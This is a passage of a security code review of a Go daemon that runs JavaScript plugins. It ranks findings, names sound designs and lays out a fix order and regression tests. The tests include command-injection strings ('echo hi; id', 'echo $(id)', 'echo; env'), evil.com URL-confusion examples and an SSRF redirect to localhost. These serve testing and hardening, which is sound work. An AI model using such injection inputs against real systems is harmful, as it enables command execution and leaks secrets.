| L20 | `plugin/checksum.go:193` | `DetectPluginName`'s regex can match a nested object's `name:` property, so `digest -format yaml` / `-verify` may key on the wrong name and check a different file than the loader loads. `-verify` also skips disabled entries that the loader still executes (see H3). |

---

## Definitely wrong vs. likely wrong if X

**Definitely wrong (demonstrable from the code as written):** H1, H2, H3, H4, H5, M1, M2, M4,
M5, M6, M7, M8, M9, M10, M11, L2, L3, L4, L6, L9, L11, L12, L14, L15, L19.

Everything above is a record of the review as written. H1–H5 and M1–M11 have
since been fixed; the Low items below have not.

**Likely wrong if X:**

* L5 (`resolvers` map) — only bites if a second `LoadConfigBytes` ever runs concurrently with
  the first, i.e. if config reload or parallel tests are added.
* L7 (Vault nil `Auth`) — depends on the Vault server returning a 204/empty body for
  `auth/<approle>/login`; the client does not check.
* L13 (revocation key ambiguity) — requires an operator to mint a token whose username contains
  `:` or whitespace.
* L20 (`DetectPluginName`) — requires a plugin file whose first `name: "…"` is not the exported
  one.
* H5's agent-reachability — depends on a plugin forwarding a numeric argument into
  `randomBytes`/`chunkSize`; the panic itself is unconditional once a negative reaches those
  functions.

**Could not verify from the code shown:** whether the deployment ever sets
`allowed_commands` with a broad binary (`sh`, `bash`, `env`, `python`, `find`) — that would
turn H1 from "a plugin can escape its allowlist" into "the allowlist is equivalent to no
allowlist". Worth auditing every `allowed_commands` block in `configuration/` and `deploy/`.

---

## Patterns that are sound — do not "fix" these

* `auth/token.go:Validate` — `hmac.Equal` for the signature, and it cross-checks the payload's
  embedded `Progname` against the expected one. Correct.
* `configguard.go:load` — hashes the *same byte slice* that is then parsed, so there is no
  check/use window; and from an unverified file it reads only `require_config_checksum`, which
  can only make the process stricter. Correct fail-closed design.
* `integrity.ParseChecksum` — a malformed or unknown-algorithm checksum is an error, never a
  silent "no checksum configured". Correct.
* `host/fs/fs.go:isPathAllowed` — resolves symlinks (including on the parent of a
  not-yet-existing path), requires a directory-boundary prefix, and fails closed on an empty
  allowlist. The TOCTOU between check and `os.ReadFile` remains, but the design is right.
* `host/env/env.go:GetEnv` and `httpclient.isDomainAllowed` — both fail closed on an empty
  allowlist, and `isDomainAllowed` compares the *parsed* `Hostname()`, which defeats
  `http://allowed@evil.com` and `http://evil.com#@allowed.com`. Sound.
* `auth/revoker.go` — `reload` swaps the map under an `RWMutex`; a read failure keeps the
  previous snapshot rather than making everything look revoked or valid; `writeEntries` uses
  temp + rename; a missing file is an empty list, not an error.
* `plugin/safeExport` and `server/bridge.go:addTool` — recovering around `Export()` and around
  `mcp.AddTool`'s panic-only failure channel is correct, and `normalizeInputSchema` /
  `schemaForSDK` validate before the SDK can panic. Keep.
* **`plugin/makeModuleLoader`'s `panic(*goja.Exception)` idiom works** — goja converts a
  panic carrying an `*Exception` into a JS throw (`vm.go:handleThrow`), so `require()`'s
  errors are catchable by plugin `try/catch`. Do not "clean this up" into
  `panic(fmt.Errorf(...))`: a non-`*Exception` panic is re-raised as a Go panic
  (`vm.go:840`) and takes the process down (see H5).
* The `path.Clean` + `pluginDir + separator` prefix check in `makeModuleLoader` correctly
  blocks traversal, including absolute paths (because `filepath.Join` re-roots them). It does
  not follow symlinks — a symlink inside `plugin_dir` can still point outside it — but that
  requires write access to `plugin_dir`, which is already game over.

---

## Suggested fix order

Kept as written, for the record. Steps 1–10 are done (see the status table).

Security first, then availability, then correctness:

1. **H1** — replace `sh -c` with argv-form exec. Highest severity, smallest patch.
2. **H2** — add a per-plugin mutex. Two lines, removes a class of process-killing crashes.
3. **H4** — `CheckRedirect` with the same allowlist. One function.
4. **H3** — load only configured plugins (or verify before `RunString`). Stops pre-gate code
   execution and removes the startup-DoS-by-stray-file.
5. **H5** — validate `n`/`chunkSize`, then a `recover()` in `CallTool`.
6. **M4** — put `/rpc/openapi.json` behind the auth chain.
7. **M1** — collapse the eight `httpclient` entry points into one, so the method/header gates
   cannot be skipped.
8. **M3** — stop logging raw tool args; widen `MaskKeyValue`; redact URLs.
9. **M5** — `http.Server` with `ReadHeaderTimeout` + signal handling + graceful shutdown.
10. **M6**, **M7**, **M8**, **M9**, **M10**, **M11**, then the Low table.

---

## Regression tests that would catch the high-severity findings

All eight are now implemented — items 1–5 as Go tests plus the Python cases named
in the status table, items 6–8 as the Python cases `transport.openapi-auth`,
`sandbox.http-method-convenience` and `sandbox.fs-write-atomic`. The list is kept
as written so the mapping stays checkable.

1. **H1 — exec allowlist.** Plugin with `allowed_commands: ["echo"]`; call
   `runCommand("echo hi; id")` and `runCommand("echo $(id)")`. Assert the tool errors (or that
   `id`'s output is absent) and that a canary file the injected command would create does not
   exist. Add `runCommand("echo; env")` and assert no environment variable outside
   `allowed_env_vars` appears in the output.
2. **H2 — VM concurrency.** Start the daemon, open one session, and issue N=8 pipelined
   `tools/call` requests for the same tool whose plugin sleeps briefly and returns a
   per-call nonce. Run the binary built with `-race` (or a `go test -race` harness calling
   `pm.CallTool` from 8 goroutines). Assert: no race report, no `concurrent map writes`, and
   every response carries its own nonce. This test fails today.
3. **H3 — no execution before verification.** (a) Drop an unlisted `evil.js` whose module body
   writes a marker file; start the daemon with `require_plugin_checksums: false`; assert the
   marker does not exist. (b) With `require_plugin_checksums: true` and a *tampered*
   configured plugin whose body writes a marker, assert startup exits non-zero **and** the
   marker does not exist (proving the check ran before the code).
4. **H4 — redirect SSRF.** `httptest` server A (allowlisted) returns `302` to
   `http://127.0.0.1:<portB>/`; server B records the hit. Call `host.http.get(A)`; assert the
   tool errors and server B received no request. Repeat with a redirect that keeps the host but
   changes scheme, and with 6 chained redirects (assert the loop cap).
5. **H5 — panic containment.** Plugin exposes `host.crypto.randomBytes(params.n)`; call with
   `n = -1` and with `n = 1e18`. Assert the daemon is still alive afterwards and the tool
   returned an error. Repeat for `fs.readStream` with `chunkSize: -1` and `chunkSize: 0`.
6. **M4 — openapi auth.** `GET /rpc/openapi.json` with no `Authorization` header → `401`
   (today: `200` with the full tool list). Same with `DELETE`.
7. **M1 — method/header gates.** Plugin with `allowed_http_methods: ["GET"]` and
   `allowed_headers: ["Accept"]`; assert `host.http.post(...)` and
   `host.http.get(url, {"X-Exfil": "1"})` both error, while `get` with `Accept` succeeds.
8. **M6 — write atomicity.** `writeStream` to an existing file with a callback that throws on
   the first chunk; assert the original content is intact.
